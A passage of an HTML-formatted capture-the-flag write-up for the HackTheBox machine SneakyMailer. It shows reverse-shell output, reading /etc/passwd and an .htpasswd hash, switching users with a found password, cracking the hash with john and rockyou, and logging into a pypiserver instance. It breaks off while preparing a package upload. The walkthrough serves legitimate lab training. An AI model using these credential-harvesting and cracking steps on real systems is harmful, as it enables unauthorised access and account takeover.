</span></span><span class=line><span class=cl><span class=n>Reverse</span> <span class=n>shell</span> <span class=n>connected</span><span class=p>,</span> <span class=n>insert</span> <span class=n>commands</span><span class=o>.</span> <span class=n>Append</span> <span class=n>semi</span><span class=o>-</span><span class=n>colon</span> <span class=n>help</span> <span class=n>to</span> <span class=n>get</span> <span class=n>the</span> <span class=n>commands</span> <span class=n>accepted</span><span class=o>.</span>
</span></span><span class=line><span class=cl><span class=o>/</span><span class=n>bin</span><span class=o>/</span><span class=n>sh</span><span class=p>:</span> <span class=mi>0</span><span class=p>:</span> <span class=n>can</span><span class=s1>&#39;t access tty; job control turned off</span>
</span></span><span class=line><span class=cl><span class=o>$</span> <span class=n>id</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=n>uid</span><span class=o>=</span><span class=mi>33</span><span class=p>(</span><span class=n>www</span><span class=o>-</span><span class=n>data</span><span class=p>)</span> <span class=n>gid</span><span class=o>=</span><span class=mi>33</span><span class=p>(</span><span class=n>www</span><span class=o>-</span><span class=n>data</span><span class=p>)</span> <span class=n>groups</span><span class=o>=</span><span class=mi>33</span><span class=p>(</span><span class=n>www</span><span class=o>-</span><span class=n>data</span><span class=p>)</span>
</span></span></code></pre></td></tr></table></div></div><h2 id=privilege-escalation-of-machine--from-www-data-to-developer>Privilege Escalation of Machine : from www-data to developer<a hidden class=anchor aria-hidden=true href=#privilege-escalation-of-machine--from-www-data-to-developer>#</a></h2><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-gdscript3 data-lang=gdscript3><span class=line><span class=cl><span class=o>$</span> <span class=n>cat</span> <span class=o>/</span><span class=n>etc</span><span class=o>/</span><span class=n>passwd</span>
</span></span><span class=line><span class=cl><span class=n>root</span><span class=p>:</span><span class=n>x</span><span class=p>:</span><span class=mi>0</span><span class=p>:</span><span class=mi>0</span><span class=p>:</span><span class=n>root</span><span class=p>:</span><span class=o>/</span><span class=n>root</span><span class=p>:</span><span class=o>/</span><span class=n>bin</span><span class=o>/</span><span class=n>bash</span>
</span></span><span class=line><span class=cl><span class=n>daemon</span><span class=p>:</span><span class=n>x</span><span class=p>:</span><span class=mi>1</span><span class=p>:</span><span class=mi>1</span><span class=p>:</span><span class=n>daemon</span><span class=p>:</span><span class=o>/</span><span class=n>usr</span><span class=o>/</span><span class=n>sbin</span><span class=p>:</span><span class=o>/</span><span class=n>usr</span><span class=o>/</span><span class=n>sbin</span><span class=o>/</span><span class=n>nologin</span>
</span></span><span class=line><span class=cl><span class=n>bin</span><span class=p>:</span><span class=n>x</span><span class=p>:</span><span class=mi>2</span><span class=p>:</span><span class=mi>2</span><span class=p>:</span><span class=n>bin</span><span class=p>:</span><span class=o>/</span><span class=n>bin</span><span class=p>:</span><span class=o>/</span><span class=n>usr</span><span class=o>/</span><span class=n>sbin</span><span class=o>/</span><span class=n>nologin</span>
</span></span><span class=line><span class=cl><span class=n>sys</span><span class=p>:</span><span class=n>x</span><span class=p>:</span><span class=mi>3</span><span class=p>:</span><span class=mi>3</span><span class=p>:</span><span class=n>sys</span><span class=p>:</span><span class=o>/</span><span class=n>dev</span><span class=p>:</span><span class=o>/</span><span class=n>usr</span><span class=o>/</span><span class=n>sbin</span><span class=o>/</span><span class=n>nologin</span>
</span></span><span class=line><span class=cl><span class=n>sync</span><span class=p>:</span><span class=n>x</span><span class=p>:</span><span class=mi>4</span><span class=p>:</span><span class=mi>65534</span><span class=p>:</span><span class=n>sync</span><span class=p>:</span><span class=o>/</span><span class=n>bin</span><span class=p>:</span><span class=o>/</span><span class=n>bin</span><span class=o>/</span><span class=n>sync</span>
</span></span><span class=line><span class=cl><span class=n>games</span><span class=p>:</span><span class=n>x</span><span class=p>:</span><span class=mi>5</span><span class=p>:</span><span class=mi>60</span><span class=p>:</span><span class=n>games</span><span class=p>:</span><span class=o>/</span><span class=n>usr</span><span class=o>/</span><span class=n>games</span><span class=p>:</span><span class=o>/</span><span class=n>usr</span><span class=o>/</span><span class=n>sbin</span><span class=o>/</span><span class=n>nologin</span>
</span></span><span class=line><span class=cl><span class=n>man</span><span class=p>:</span><span class=n>x</span><span class=p>:</span><span class=mi>6</span><span class=p>:</span><span class=mi>12</span><span class=p>:</span><span class=n>man</span><span class=p>:</span><span class=o>/</span><span class=k>var</span><span class=o>/</span><span class=n>cache</span><span class=o>/</span><span class=n>man</span><span class=p>:</span><span class=o>/</span><span class=n>usr</span><span class=o>/</span><span class=n>sbin</span><span class=o>/</span><span class=n>nologin</span>
</span></span><span class=line><span class=cl><span class=n>lp</span><span class=p>:</span><span class=n>x</span><span class=p>:</span><span class=mi>7</span><span class=p>:</span><span class=mi>7</span><span class=p>:</span><span class=n>lp</span><span class=p>:</span><span class=o>/</span><span class=k>var</span><span class=o>/</span><span class=n>spool</span><span class=o>/</span><span class=n>lpd</span><span class=p>:</span><span class=o>/</span><span class=n>usr</span><span class=o>/</span><span class=n>sbin</span><span class=o>/</span><span class=n>nologin</span>
</span></span><span class=line><span class=cl><span class=n>mail</span><span class=p>:</span><span class=n>x</span><span class=p>:</span><span class=mi>8</span><span class=p>:</span><span class=mi>8</span><span class=p>:</span><span class=n>mail</span><span class=p>:</span><span class=o>/</span><span class=k>var</span><span class=o>/</span><span class=n>mail</span><span class=p>:</span><span class=o>/</span><span class=n>usr</span><span class=o>/</span><span class=n>sbin</span><span class=o>/</span><span class=n>nologin</span>
</span></span><span class=line><span class=cl><span class=n>news</span><span class=p>:</span><span class=n>x</span><span class=p>:</span><span class=mi>9</span><span class=p>:</span><span class=mi>9</span><span class=p>:</span><span class=n>news</span><span class=p>:</span><span class=o>/</span><span class=k>var</span><span class=o>/</span><span class=n>spool</span><span class=o>/</span><span class=n>news</span><span class=p>:</span><span class=o>/</span><span class=n>usr</span><span class=o>/</span><span class=n>sbin</span><span class=o>/</span><span class=n>nologin</span>
</span></span><span class=line><span class=cl><span class=n>uucp</span><span class=p>:</span><span class=n>x</span><span class=p>:</span><span class=mi>10</span><span class=p>:</span><span class=mi>10</span><span class=p>:</span><span class=n>uucp</span><span class=p>:</span><span class=o>/</span><span class=k>var</span><span class=o>/</span><span class=n>spool</span><span class=o>/</span><span class=n>uucp</span><span class=p>:</span><span class=o>/</span><span class=n>usr</span><span class=o>/</span><span class=n>sbin</span><span class=o>/</span><span class=n>nologin</span>
</span></span><span class=line><span class=cl><span class=n>proxy</span><span class=p>:</span><span class=n>x</span><span class=p>:</span><span class=mi>13</span><span class=p>:</span><span class=mi>13</span><span class=p>:</span><span class=n>proxy</span><span class=p>:</span><span class=o>/</span><span class=n>bin</span><span class=p>:</span><span class=o>/</span><span class=n>usr</span><span class=o>/</span><span class=n>sbin</span><span class=o>/</span><span class=n>nologin</span>
</span></span><span class=line><span class=cl><span class=n>www</span><span class=o>-</span><span class=n>data</span><span class=p>:</span><span class=n>x</span><span class=p>:</span><span class=mi>33</span><span class=p>:</span><span class=mi>33</span><span class=p>:</span><span class=n>www</span><span class=o>-</span><span class=n>data</span><span class=p>:</span><span class=o>/</span><span class=k>var</span><span class=o>/</span><span class=n>www</span><span class=p>:</span><span class=o>/</span><span class=n>usr</span><span class=o>/</span><span class=n>sbin</span><span class=o>/</span><span class=n>nologin</span>
</span></span><span class=line><span class=cl><span class=n>backup</span><span class=p>:</span><span class=n>x</span><span class=p>:</span><span class=mi>34</span><span class=p>:</span><span class=mi>34</span><span class=p>:</span><span class=n>backup</span><span class=p>:</span><span class=o>/</span><span class=k>var</span><span class=o>/</span><span class=n>backups</span><span class=p>:</span><span class=o>/</span><span class=n>usr</span><span class=o>/</span><span class=n>sbin</span><span class=o>/</span><span class=n>nologin</span>
</span></span><span class=line><span class=cl><span class=n>list</span><span class=p>:</span><span class=n>x</span><span class=p>:</span><span class=mi>38</span><span class=p>:</span><span class=mi>38</span><span class=p>:</span><span class=n>Mailing</span> <span class=n>List</span> <span class=n>Manager</span><span class=p>:</span><span class=o>/</span><span class=k>var</span><span class=o>/</span><span class=n>list</span><span class=p>:</span><span class=o>/</span><span class=n>usr</span><span class=o>/</span><span class=n>sbin</span><span class=o>/</span><span class=n>nologin</span>
</span></span><span class=line><span class=cl><span class=n>irc</span><span class=p>:</span><span class=n>x</span><span class=p>:</span><span class=mi>39</span><span class=p>:</span><span class=mi>39</span><span class=p>:</span><span class=n>ircd</span><span class=p>:</span><span class=o>/</span><span class=k>var</span><span class=o>/</span><span class=n>run</span><span class=o>/</span><span class=n>ircd</span><span class=p>:</span><span class=o>/</span><span class=n>usr</span><span class=o>/</span><span class=n>sbin</span><span class=o>/</span><span class=n>nologin</span>
</span></span><span class=line><span class=cl><span class=n>gnats</span><span class=p>:</span><span class=n>x</span><span class=p>:</span><span class=mi>41</span><span class=p>:</span><span class=mi>41</span><span class=p>:</span><span class=n>Gnats</span> <span class=n>Bug</span><span class=o>-</span><span class=n>Reporting</span> <span class=n>System</span> <span class=p>(</span><span class=n>admin</span><span class=p>):</span><span class=o>/</span><span class=k>var</span><span class=o>/</span><span class=n>lib</span><span class=o>/</span><span class=n>gnats</span><span class=p>:</span><span class=o>/</span><span class=n>usr</span><span class=o>/</span><span class=n>sbin</span><span class=o>/</span><span class=n>nologin</span>
</span></span><span class=line><span class=cl><span class=n>nobody</span><span class=p>:</span><span class=n>x</span><span class=p>:</span><span class=mi>65534</span><span class=p>:</span><span class=mi>65534</span><span class=p>:</span><span class=n>nobody</span><span class=p>:</span><span class=o>/</span><span class=n>nonexistent</span><span class=p>:</span><span class=o>/</span><span class=n>usr</span><span class=o>/</span><span class=n>sbin</span><span class=o>/</span><span class=n>nologin</span>
</span></span><span class=line><span class=cl><span class=n>_apt</span><span class=p>:</span><span class=n>x</span><span class=p>:</span><span class=mi>100</span><span class=p>:</span><span class=mi>65534</span><span class=p>::</span><span class=o>/</span><span class=n>nonexistent</span><span class=p>:</span><span class=o>/</span><span class=n>usr</span><span class=o>/</span><span class=n>sbin</span><span class=o>/</span><span class=n>nologin</span>
</span></span><span class=line><span class=cl><span class=n>systemd</span><span class=o>-</span><span class=n>timesync</span><span class=p>:</span><span class=n>x</span><span class=p>:</span><span class=mi>101</span><span class=p>:</span><span class=mi>102</span><span class=p>:</span><span class=n>systemd</span> <span class=n>Time</span> <span class=n>Synchronization</span><span class=p>,,,:</span><span class=o>/</span><span class=n>run</span><span class=o>/</span><span class=n>systemd</span><span class=p>:</span><span class=o>/</span><span class=n>usr</span><span class=o>/</span><span class=n>sbin</span><span class=o>/</span><span class=n>nologin</span>
</span></span><span class=line><span class=cl><span class=n>systemd</span><span class=o>-</span><span class=n>network</span><span class=p>:</span><span class=n>x</span><span class=p>:</span><span class=mi>102</span><span class=p>:</span><span class=mi>103</span><span class=p>:</span><span class=n>systemd</span> <span class=n>Network</span> <span class=n>Management</span><span class=p>,,,:</span><span class=o>/</span><span class=n>run</span><span class=o>/</span><span class=n>systemd</span><span class=p>:</span><span class=o>/</span><span class=n>usr</span><span class=o>/</span><span class=n>sbin</span><span class=o>/</span><span class=n>nologin</span>
</span></span><span class=line><span class=cl><span class=n>systemd</span><span class=o>-</span><span class=n>resolve</span><span class=p>:</span><span class=n>x</span><span class=p>:</span><span class=mi>103</span><span class=p>:</span><span class=mi>104</span><span class=p>:</span><span class=n>systemd</span> <span class=n>Resolver</span><span class=p>,,,:</span><span class=o>/</span><span class=n>run</span><span class=o>/</span><span class=n>systemd</span><span class=p>:</span><span class=o>/</span><span class=n>usr</span><span class=o>/</span><span class=n>sbin</span><span class=o>/</span><span class=n>nologin</span>
</span></span><span class=line><span class=cl><span class=n>messagebus</span><span class=p>:</span><span class=n>x</span><span class=p>:</span><span class=mi>104</span><span class=p>:</span><span class=mi>110</span><span class=p>::</span><span class=o>/</span><span class=n>nonexistent</span><span class=p>:</span><span class=o>/</span><span class=n>usr</span><span class=o>/</span><span class=n>sbin</span><span class=o>/</span><span class=n>nologin</span>
</span></span><span class=line><span class=cl><span class=n>avahi</span><span class=o>-</span><span class=n>autoipd</span><span class=p>:</span><span class=n>x</span><span class=p>:</span><span class=mi>105</span><span class=p>:</span><span class=mi>112</span><span class=p>:</span><span class=n>Avahi</span> <span class=n>autoip</span> <span class=n>daemon</span><span class=p>,,,:</span><span class=o>/</span><span class=k>var</span><span class=o>/</span><span class=n>lib</span><span class=o>/</span><span class=n>avahi</span><span class=o>-</span><span class=n>autoipd</span><span class=p>:</span><span class=o>/</span><span class=n>usr</span><span class=o>/</span><span class=n>sbin</span><span class=o>/</span><span class=n>nologin</span>
</span></span><span class=line><span class=cl><span class=n>sshd</span><span class=p>:</span><span class=n>x</span><span class=p>:</span><span class=mi>106</span><span class=p>:</span><span class=mi>65534</span><span class=p>::</span><span class=o>/</span><span class=n>run</span><span class=o>/</span><span class=n>sshd</span><span class=p>:</span><span class=o>/</span><span class=n>usr</span><span class=o>/</span><span class=n>sbin</span><span class=o>/</span><span class=n>nologin</span>
</span></span><span class=line><span class=cl><span class=n>low</span><span class=p>:</span><span class=n>x</span><span class=p>:</span><span class=mi>1000</span><span class=p>:</span><span class=mi>1000</span><span class=p>:,,,:</span><span class=o>/</span><span class=n>home</span><span class=o>/</span><span class=n>low</span><span class=p>:</span><span class=o>/</span><span class=n>bin</span><span class=o>/</span><span class=n>bash</span>
</span></span><span class=line><span class=cl><span class=n>systemd</span><span class=o>-</span><span class=n>coredump</span><span class=p>:</span><span class=n>x</span><span class=p>:</span><span class=mi>999</span><span class=p>:</span><span class=mi>999</span><span class=p>:</span><span class=n>systemd</span> <span class=n>Core</span> <span class=n>Dumper</span><span class=p>:</span><span class=o>/</span><span class=p>:</span><span class=o>/</span><span class=n>usr</span><span class=o>/</span><span class=n>sbin</span><span class=o>/</span><span class=n>nologin</span>
</span></span><span class=line><span class=cl><span class=n>ftp</span><span class=p>:</span><span class=n>x</span><span class=p>:</span><span class=mi>107</span><span class=p>:</span><span class=mi>115</span><span class=p>:</span><span class=n>ftp</span> <span class=n>daemon</span><span class=p>,,,:</span><span class=o>/</span><span class=n>srv</span><span class=o>/</span><span class=n>ftp</span><span class=p>:</span><span class=o>/</span><span class=n>usr</span><span class=o>/</span><span class=n>sbin</span><span class=o>/</span><span class=n>nologin</span>
</span></span><span class=line><span class=cl><span class=n>postfix</span><span class=p>:</span><span class=n>x</span><span class=p>:</span><span class=mi>108</span><span class=p>:</span><span class=mi>116</span><span class=p>::</span><span class=o>/</span><span class=k>var</span><span class=o>/</span><span class=n>spool</span><span class=o>/</span><span class=n>postfix</span><span class=p>:</span><span class=o>/</span><span class=n>usr</span><span class=o>/</span><span class=n>sbin</span><span class=o>/</span><span class=n>nologin</span>
</span></span><span class=line><span class=cl><span class=n>courier</span><span class=p>:</span><span class=n>x</span><span class=p>:</span><span class=mi>109</span><span class=p>:</span><span class=mi>118</span><span class=p>::</span><span class=o>/</span><span class=k>var</span><span class=o>/</span><span class=n>lib</span><span class=o>/</span><span class=n>courier</span><span class=p>:</span><span class=o>/</span><span class=n>usr</span><span class=o>/</span><span class=n>sbin</span><span class=o>/</span><span class=n>nologin</span>
</span></span><span class=line><span class=cl><span class=n>vmail</span><span class=p>:</span><span class=n>x</span><span class=p>:</span><span class=mi>5000</span><span class=p>:</span><span class=mi>5000</span><span class=p>::</span><span class=o>/</span><span class=n>home</span><span class=o>/</span><span class=n>vmail</span><span class=p>:</span><span class=o>/</span><span class=n>usr</span><span class=o>/</span><span class=n>sbin</span><span class=o>/</span><span class=n>nologin</span>
</span></span><span class=line><span class=cl><span class=n>developer</span><span class=p>:</span><span class=n>x</span><span class=p>:</span><span class=mi>1001</span><span class=p>:</span><span class=mi>1001</span><span class=p>:,,,:</span><span class=o>/</span><span class=k>var</span><span class=o>/</span><span class=n>www</span><span class=o>/</span><span class=n>dev</span><span class=o>.</span><span class=n>sneakycorp</span><span class=o>.</span><span class=n>htb</span><span class=p>:</span><span class=o>/</span><span class=n>bin</span><span class=o>/</span><span class=n>bash</span>
</span></span><span class=line><span class=cl><span class=n>pypi</span><span class=p>:</span><span class=n>x</span><span class=p>:</span><span class=mi>998</span><span class=p>:</span><span class=mi>998</span><span class=p>::</span><span class=o>/</span><span class=k>var</span><span class=o>/</span><span class=n>www</span><span class=o>/</span><span class=n>pypi</span><span class=o>.</span><span class=n>sneakycorp</span><span class=o>.</span><span class=n>htb</span><span class=p>:</span><span class=o>/</span><span class=n>usr</span><span class=o>/</span><span class=n>sbin</span><span class=o>/</span><span class=n>nologin</span>
</span></span></code></pre></td></tr></table></div></div><p>There are 2 users excluding roto that have a shell: low & developer.</p><p>Let&rsquo;s try the dev creds:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>$ su developer
</span></span><span class=line><span class=cl>Password: m^AsY7vTKVT+dV1{WOU%@NaHkUAId3]C
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>id
</span></span><span class=line><span class=cl>uid=1001(developer) gid=1001(developer) groups=1001(developer)
</span></span></code></pre></td></tr></table></div></div><p>But the home directory of developer is <code>/var/www/dev.sneakycorp.htb</code>
the flag is not here.</p><p>We may look elsewhere.</p><h2 id=privilege-escalation-of-machine--from-developer-to-low>Privilege Escalation of Machine : from developer to low<a hidden class=anchor aria-hidden=true href=#privilege-escalation-of-machine--from-developer-to-low>#</a></h2><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>ls -lh /home
</span></span><span class=line><span class=cl>total 8.0K
</span></span><span class=line><span class=cl>drwxr-xr-x 8 low   low   4.0K Jun  8 03:47 low
</span></span><span class=line><span class=cl>drwx------ 5 vmail vmail 4.0K May 19 21:10 vmail
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>ls -lhA /home/low
</span></span><span class=line><span class=cl>total 40K
</span></span><span class=line><span class=cl>lrwxrwxrwx 1 root root    9 May 19 21:09 .bash_history -&gt; /dev/null
</span></span><span class=line><span class=cl>-rw-r--r-- 1 low  low   220 May 14 05:46 .bash_logout
</span></span><span class=line><span class=cl>-rw-r--r-- 1 low  low  3.5K May 14 05:46 .bashrc
</span></span><span class=line><span class=cl>drwxr-xr-x 3 low  low  4.0K May 16 03:34 .cache
</span></span><span class=line><span class=cl>drwx------ 3 low  low  4.0K May 14 13:21 .gnupg
</span></span><span class=line><span class=cl>drwxr-xr-x 3 low  low  4.0K May 16 03:37 .local
</span></span><span class=line><span class=cl>dr-x------ 2 low  low  4.0K May 16 03:30 .pip
</span></span><span class=line><span class=cl>-rw-r--r-- 1 low  low   807 May 14 05:46 .profile
</span></span><span class=line><span class=cl>drwxr-xr-x 2 low  low  4.0K Jun  8 03:47 .ssh
</span></span><span class=line><span class=cl>-rwxr-x--- 1 root low    33 Nov  9 10:36 user.txt
</span></span><span class=line><span class=cl>drwxr-xr-x 6 low  low  4.0K May 16 03:33 venv
</span></span></code></pre></td></tr></table></div></div><p>We already saw 2 references to pypi, now there is a venv folder own by low
and in <code>/etc/passwd</code> an account named pypi which has a home folder named
<code>/var/www/pypi.sneakycorp.htb</code>.</p><p>It seems the pe will go through venv/pypi.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-gdscript3 data-lang=gdscript3><span class=line><span class=cl><span class=n>ls</span> <span class=o>-</span><span class=n>lhA</span> <span class=o>/</span><span class=k>var</span><span class=o>/</span><span class=n>www</span><span class=o>/</span><span class=n>pypi</span><span class=o>.</span><span class=n>sneakycorp</span><span class=o>.</span><span class=n>htb</span>
</span></span><span class=line><span class=cl><span class=n>total</span> <span class=mi>12</span><span class=n>K</span>
</span></span><span class=line><span class=cl><span class=o>-</span><span class=n>rw</span><span class=o>-</span><span class=n>r</span><span class=o>--</span><span class=n>r</span><span class=o>--</span> <span class=mi>1</span> <span class=n>root</span> <span class=n>root</span>       <span class=mi>43</span> <span class=n>May</span> <span class=mi>15</span> <span class=mi>14</span><span class=p>:</span><span class=mi>29</span> <span class=o>.</span><span class=n>htpasswd</span>
</span></span><span class=line><span class=cl><span class=n>drwxrwx</span><span class=o>---</span> <span class=mi>2</span> <span class=n>root</span> <span class=n>pypi</span><span class=o>-</span><span class=n>pkg</span> <span class=mf>4.0</span><span class=n>K</span> <span class=n>Nov</span>  <span class=mi>9</span> <span class=mi>12</span><span class=p>:</span><span class=mi>19</span> <span class=n>packages</span>
</span></span><span class=line><span class=cl><span class=n>drwxr</span><span class=o>-</span><span class=n>xr</span><span class=o>-</span><span class=n>x</span> <span class=mi>6</span> <span class=n>root</span> <span class=n>pypi</span>     <span class=mf>4.0</span><span class=n>K</span> <span class=n>May</span> <span class=mi>14</span> <span class=mi>18</span><span class=p>:</span><span class=mi>25</span> <span class=n>venv</span>
</span></span></code></pre></td></tr></table></div></div><p>We can check the hash:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-gdscript3 data-lang=gdscript3><span class=line><span class=cl><span class=n>cat</span> <span class=o>/</span><span class=k>var</span><span class=o>/</span><span class=n>www</span><span class=o>/</span><span class=n>pypi</span><span class=o>.</span><span class=n>sneakycorp</span><span class=o>.</span><span class=n>htb</span><span class=o>/.</span><span class=n>htpasswd</span>
</span></span><span class=line><span class=cl><span class=n>pypi</span><span class=p>:</span><span class=o>$</span><span class=n>apr1</span><span class=o>$</span><span class=n>RV5c5YVs</span><span class=o>$</span><span class=n>U9</span><span class=o>.</span><span class=n>OTqF5n8K4mxWpSSR</span><span class=o>/</span><span class=n>p</span><span class=o>/</span>
</span></span></code></pre></td></tr></table></div></div><p>Let&rsquo;s see the kind of hash:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>$ haiti &#39;$apr1$RV5c5YVs$U9.OTqF5n8K4mxWpSSR/p/&#39;
</span></span><span class=line><span class=cl>MD5(APR) [HC: 1600]
</span></span><span class=line><span class=cl>Apache MD5 [HC: 1600]
</span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span><span class=lnt>8
</span><span class=lnt>9
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-gdscript3 data-lang=gdscript3><span class=line><span class=cl><span class=o>$</span> <span class=n>john</span> <span class=nb>hash</span><span class=o>.</span><span class=n>txt</span> <span class=o>--</span><span class=n>wordlist</span><span class=o>=/</span><span class=n>usr</span><span class=o>/</span><span class=n>share</span><span class=o>/</span><span class=n>wordlists</span><span class=o>/</span><span class=n>passwords</span><span class=o>/</span><span class=n>rockyou</span><span class=o>.</span><span class=n>txt</span> <span class=o>--</span><span class=n>format</span><span class=o>=</span><span class=n>md5crypt</span>
</span></span><span class=line><span class=cl><span class=n>Using</span> <span class=n>default</span> <span class=n>input</span> <span class=n>encoding</span><span class=p>:</span> <span class=n>UTF</span><span class=o>-</span><span class=mi>8</span>
</span></span><span class=line><span class=cl><span class=n>Loaded</span> <span class=mi>1</span> <span class=n>password</span> <span class=nb>hash</span> <span class=p>(</span><span class=n>md5crypt</span><span class=p>,</span> <span class=n>crypt</span><span class=p>(</span><span class=mi>3</span><span class=p>)</span> <span class=o>$</span><span class=mi>1</span><span class=o>$</span> <span class=p>(</span><span class=ow>and</span> <span class=n>variants</span><span class=p>)</span> <span class=p>[</span><span class=n>MD5</span> <span class=mi>128</span><span class=o>/</span><span class=mi>128</span> <span class=n>AVX</span> <span class=mi>4</span><span class=n>x3</span><span class=p>])</span>
</span></span><span class=line><span class=cl><span class=n>Will</span> <span class=n>run</span> <span class=mi>4</span> <span class=n>OpenMP</span> <span class=n>threads</span>
</span></span><span class=line><span class=cl><span class=n>Press</span> <span class=s1>&#39;q&#39;</span> <span class=ow>or</span> <span class=n>Ctrl</span><span class=o>-</span><span class=n>C</span> <span class=n>to</span> <span class=n>abort</span><span class=p>,</span> <span class=n>almost</span> <span class=n>any</span> <span class=n>other</span> <span class=n>key</span> <span class=k>for</span> <span class=n>status</span>
</span></span><span class=line><span class=cl><span class=n>soufianeelhaoui</span>  <span class=p>(</span><span class=n>pypi</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=mi>1</span><span class=n>g</span> <span class=mi>0</span><span class=p>:</span><span class=mi>00</span><span class=p>:</span><span class=mi>00</span><span class=p>:</span><span class=mi>27</span> <span class=n>DONE</span> <span class=p>(</span><span class=mi>2020</span><span class=o>-</span><span class=mi>11</span><span class=o>-</span><span class=mi>09</span> <span class=mi>21</span><span class=p>:</span><span class=mi>36</span><span class=p>)</span> <span class=mf>0.03652</span><span class=n>g</span><span class=o>/</span><span class=n>s</span> <span class=mi>130543</span><span class=n>p</span><span class=o>/</span><span class=n>s</span> <span class=mi>130543</span><span class=n>c</span><span class=o>/</span><span class=n>s</span> <span class=mi>130543</span><span class=n>C</span><span class=o>/</span><span class=n>s</span> <span class=n>souhegan</span><span class=o>..</span><span class=n>souderton0</span>
</span></span><span class=line><span class=cl><span class=n>Use</span> <span class=n>the</span> <span class=s2>&#34;--show&#34;</span> <span class=n>option</span> <span class=n>to</span> <span class=n>display</span> <span class=n>all</span> <span class=n>of</span> <span class=n>the</span> <span class=n>cracked</span> <span class=n>passwords</span> <span class=n>reliably</span>
</span></span><span class=line><span class=cl><span class=n>Session</span> <span class=n>complete</span>
</span></span></code></pre></td></tr></table></div></div><p>Let&rsquo;s add the new sub-domain to <code>/etc/hosts</code>.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>$ cat /etc/hosts | grep sneak
</span></span><span class=line><span class=cl>10.10.10.197 sneakycorp.htb dev.sneakycorp.htb pypi.sneakycorp.htb
</span></span></code></pre></td></tr></table></div></div><p>On port 80 we have the same website as for sneakycorp.htb but on port 8080
we can see an app called pypiserver. (<a href=http://pypi.sneakycorp.htb:8080/>http://pypi.sneakycorp.htb:8080/</a>)</p><blockquote><p>Welcome to pypiserver!</p><p>This is a PyPI compatible package index serving 0 packages.</p><p>To use this server with pip, run the following command:</p><pre><code>    pip install --index-url http://pypi.sneakycorp.htb/simple/ PACKAGE [PACKAGE2...]
</code></pre><p>To use this server with easy_install, run the following command:</p><pre><code>    easy_install --index-url http://pypi.sneakycorp.htb/simple/ PACKAGE [PACKAGE2...]
</code></pre><p>The complete list of all packages can be found <a href=http://pypi.sneakycorp.htb:8080/packages/>here</a> or via the <a href=http://pypi.sneakycorp.htb:8080/simple/>simple</a> index.</p><p>This instance is running version 1.3.2 of the <a href=https://pypi.org/project/pypiserver/>pypiserver</a> software.</p></blockquote><p>We can connect to the package index () basic auth
with the cracked credentials <code>pypi</code> / <code>soufianeelhaoui</code>.</p><p>But no package is indexed yet.</p><p>RTFM. Letr&rsquo;s read the <a href=https://pypi.org/project/pypiserver/#uploading-packages-remotely>Uploading Packages Remotely</a> page
of pypiserver documentation.</p><p>The first thing we will need to upload a package is <code>~/.pypirc</code>.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
